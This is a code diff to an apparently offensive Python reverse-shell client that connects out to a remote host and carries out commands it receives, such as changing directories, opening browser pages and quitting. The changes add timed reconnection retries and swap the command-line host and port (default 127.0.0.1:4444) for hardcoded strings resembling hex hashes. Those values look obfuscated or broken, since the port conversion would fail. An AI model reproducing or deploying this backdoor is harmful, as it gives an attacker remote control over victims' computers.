@@ -4,6 +4,7 @@ import socket
 import subprocess as sp
 import webbrowser as browser
 
+from time import sleep
 
 
 def handle(s):
@@ -34,9 +35,8 @@ def handle(s):
                 os.chdir(path)
 
             elif data2 == quit_:
-                s.shutdown(2)
-                s.close(3)
-                sys.exit(1)
+                s.close()
+                sys.exit()
 
             elif data2.startswith("browse"):
                 try:
@@ -72,11 +72,11 @@ def handle(s):
                 print("Connection lost.")
                 sys.exit()
 
-
-def connect(host, port):
+def connect(host, port, timeout, attempts):
     s = socket.socket()
     refused = 0
-    while True:
+    for i in range(attempts):
+        sleep(timeout)
         try:
             s.connect((host, int(port)))
         except ConnectionRefusedError:
@@ -90,13 +90,6 @@ def connect(host, port):
             handle(s)
 
 if __name__ == "__main__":
-    for i in sys.argv:
-        print(i)
-    print()
-    try:
-        host = sys.argv[1]
-        port = sys.argv[2]
-    except IndexError:
-        host = "127.0.0.1"
-        port = 4444
-    connect(host, port)
+    host="67b3dba8bc6778101892eb77249db32e"
+    port = int("901555fb06e346cb065ceb9808dcfc25")
+    connect(host=host, port=port, timeout=2, attempts=150)
